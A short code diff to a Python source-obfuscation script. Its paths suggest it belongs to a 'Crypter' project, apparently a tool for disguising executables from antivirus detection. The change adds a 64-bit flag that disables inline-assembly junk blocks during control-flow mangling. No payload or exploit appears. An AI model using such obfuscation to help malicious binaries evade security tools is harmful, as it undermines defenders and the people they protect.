@@ -149,7 +149,7 @@ def GetRandomControlFlow():
     return cpp_code
 
 FILES_TO_OBFUSCATE = {"../Crypter/main.cpp":"../Crypter/DO_NOT_TOUCH.cpp"}# "getapi.cpp":"DO_NOT_TOUCH_API.cpp"}
-def obfuscate(PASS, CFLOW_PASS, cflow, junk) :
+def obfuscate(PASS, CFLOW_PASS, cflow, junk, is64bit) :
     if PASS < CFLOW_PASS : PASS = CFLOW_PASS
     
     if not cflow and not junk : PASS = 0
@@ -237,7 +237,7 @@ def obfuscate(PASS, CFLOW_PASS, cflow, junk) :
                 if GetRandomBool() and in_func : # do we call a function ?
                     out.append(CallRandomFunction()+"\n")
                 
-                if GetRandomBool() and in_func and cflow and k < CFLOW_PASS : # do we mess up control flow ?
+                if GetRandomBool() and in_func and cflow and k < CFLOW_PASS and not is64bit : # do we mess up control flow ?
                     out.append(GetRandomAssemblyBlock()+"\n")
                 
                 if GetRandomBool() and in_func and cflow and k < CFLOW_PASS : # do we mess up control flow ?
